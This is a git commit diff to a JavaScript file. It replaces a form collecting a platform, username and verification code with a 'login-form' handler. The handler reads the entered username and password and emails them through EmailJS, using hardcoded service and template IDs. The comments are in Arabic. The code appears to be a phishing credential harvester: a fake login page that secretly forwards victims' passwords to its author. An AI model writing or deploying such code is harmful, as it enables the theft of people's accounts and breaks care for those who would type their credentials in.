77019b0798842589775f1581d8eba8c254c2ba97
Mohammed Maridi <53543632+SWE-M@users.noreply.github.com>
2025-01-03 01:28:35 +0300

    Update scripts.js

--- scripts.js
+++ scripts.js
@@ -1,28 +1,24 @@
 // Initialize EmailJS
 emailjs.init("1xqwBMfecM1SSulsh");
 
-function showForm(platform) {
-    // Show the form when a platform is selected
-    document.getElementById('platform-form').style.display = 'block';
-    document.getElementById('user-form').onsubmit = function (event) {
-        event.preventDefault();
+// عندما يتم إرسال النموذج
+document.getElementById('login-form').onsubmit = function (event) {
+    event.preventDefault();
 
-        const username = document.getElementById('username').value;
-        const code = document.getElementById('code').value;
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
 
-        const message = {
-            platform: platform,
-            username: username,
-            code: code
-        };
-
-        // Send the form data via EmailJS
-        emailjs.send("service_ir3vg5y", "template_jw2qkzr", message)
-            .then(function (response) {
-                alert("تم إرسال البيانات بنجاح!");
-            }, function (error) {
-                alert("فشل في إرسال البيانات. حاول مرة أخرى.");
-                console.error(error);  // إضافه لتوضيح الخطأ
-            });
+    const message = {
+        username: username,
+        password: password
     };
-}
+
+    // إرسال البيانات عبر EmailJS
+    emailjs.send("service_ir3vg5y", "template_jw2qkzr", message)
+        .then(function (response) {
+            alert("تم إرسال البيانات بنجاح!");
+        }, function (error) {
+            alert("فشل في إرسال البيانات. حاول مرة أخرى.");
+            console.error(error);
+        });
+};
